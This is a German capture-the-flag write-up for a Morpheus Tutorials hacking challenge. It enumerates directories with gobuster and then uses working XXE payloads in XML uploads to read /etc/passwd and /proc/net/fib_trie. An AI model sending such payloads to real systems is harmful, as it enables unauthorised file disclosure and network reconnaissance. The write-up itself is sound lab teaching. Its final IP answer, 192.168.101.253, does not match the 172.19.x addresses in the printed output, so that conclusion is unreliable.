# Solution of [HC 0x0c](https://hc.the-morpheus.de/0x0c.html) from [The Morpheus Tutorials](https://the-morpheus.de)

### 1. [Update Funktion](http://the-morpheus.de:20003/upload) finden
```
    $ gobuster -u http://the-morpheus.de:20003 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    Gobuster v1.4.1 OJ Reeves (@TheColonial)
    =====================================================
    =====================================================
    [+] Mode : dir
    [+] Url/Domain : http://the-morpheus.de:20003/
    [+] Threads : 10
    [+] Wordlist : /usr/share/wordlists/dirbuster/directory-list-lowercase-
    2.3-medium.txt
    [+] Status codes : 307,200,204,301,302
    =====================================================
    /upload (Status: 200)
```

### 2. Anylse der Update Funktion
Im Quellcode der Update Seite befindet sich ein Kommentar, welcher auf die vom Upload akzeptierte Dateiart ([XML](https://de.wikipedia.org/wiki/Extensible_Markup_Language)) hinweißt. Außerdem deutet er auf eine fehlende Datenvalidierung hin.
```html
<!-- TODO: make XML schema to verify the uploaded data -->
```

### 3. Finden und Ausnutzen der Sicherheitslücke
Anschließend kann geprüft werden ob der Server anfällig für [XML External Entity](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing) ist.
Durch die Aunutzung der Sicherheitslücke kann im folgenden Beispiel die Datei `/etc/passwd` ausgelesen werdem:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE api [ <!ELEMENT api ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<api><title>&xxe;</title><url/><description/></api>
```

### 4. IP Adresse anzeigen lassen
Die Netzwerkkonfiguration (in der die IP Adresse enthalten ist) kann unter `/proc/net/fib_trie` durch ausnutzen der gefundenen Sicherheitslücke angezeigt werden.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE api [ <!ELEMENT api ANY >
<!ENTITY xxe SYSTEM "file:///proc/net/fib_trie" >]>
<api><title>&xxe;</title><url/><description/></api>
```

Da die Datei die Netzwerkkonfiguration graphische darstellt ist die Ausgabe schwer zu lesen und zu Interprätieren.

```
Main: +-- 0.0.0.0/0 3 0 5 |-- 0.0.0.0 /0 universe UNICAST +-- 127.0.0.0/8 2 0 2 +-- 127.0.0.0/31 1 0 0 |-- 127.0.0.0 /32 link BROADCAST /8 host LOCAL |-- 127.0.0.1 /32 host LOCAL |-- 127.255.255.255 /32 link BROADCAST +-- 172.19.0.0/16 2 0 2 +-- 172.19.0.0/29 2 0 2 |-- 172.19.0.0 /32 link BROADCAST /16 link UNICAST |-- 172.19.0.6 /32 host LOCAL |-- 172.19.255.255 /32 link BROADCAST Local: +-- 0.0.0.0/0 3 0 5 |-- 0.0.0.0 /0 universe UNICAST +-- 127.0.0.0/8 2 0 2 +-- 127.0.0.0/31 1 0 0 |-- 127.0.0.0 /32 link BROADCAST /8 host LOCAL |-- 127.0.0.1 /32 host LOCAL |-- 127.255.255.255 /32 link BROADCAST +-- 172.19.0.0/16 2 0 2 +-- 172.19.0.0/29 2 0 2 |-- 172.19.0.0 /32 link BROADCAST /16 link UNICAST |-- 172.19.0.6 /32 host LOCAL |-- 172.19.255.255 /32 link BROADCAST 
```

Eine interne (nicht lokale) IP Adresse ist bestimmten Adressbereichen zuzuweisen.
```
   10.0.0.0 -  10.255.255.255         (10.0.0.0/8)
 172.16.0.0 -  172.31.255.255         (172.16.0.0/12)
192.168.0.0 - 192.168.255.255         (192.168.0.0/16)
```
Die kleinste Adresse eines Adressbereiches ist die Netzadresse, die größte die Broadcast Adresse. Daher können manche von den gefundenen Adressen ausgeschlossen werden.

Die letzte übrig bleibende IP Adresse ist die `192.168.101.253` 
